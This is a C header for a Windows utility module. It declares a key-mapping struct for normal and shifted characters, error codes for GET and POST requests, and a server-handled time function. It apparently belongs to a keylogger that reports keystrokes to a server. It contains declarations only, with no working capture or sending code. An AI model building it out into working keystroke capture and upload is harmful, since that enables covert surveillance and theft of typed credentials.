
#include "windows.h"
#include <time.h>

#ifndef UTILS_H
#define UTILS_H

#define MAX_MSG_LEN 1028
#define MAX_BUFF_LEN 1028

/**
 * most keys have two values based upon whether caps lock
 * or shift is help down
 */
typedef struct {
    char normal;
    char onShift;
    char* unprintableKeyStr; 
} KEY_PAIR;

// generate anew key pair
KEY_PAIR* initKeyPair(char normal, char onShift, char* unprStr);

BOOL isKeyUnprintable(KEY_PAIR* kp);

void cleanupKeyPair(KEY_PAIR* kp);

typedef enum {
    ECODE_SUCCESS,
    ECODE_SAFE_RET,
    ECODE_GET,
    ECODE_POST,
    ECODE_EMPTY_BUFFER,
    ECODE_UNKNOWN_COMMAND,
    ECODE_FULL_BUFF,
    ECODE_NULL
} ERR_CODE;

time_t getCurrentTime(); // get the current time in seconds, this will be handled by the server

void swapBOOL(BOOL* value);

const char* getErrMessage(ERR_CODE code);

#endif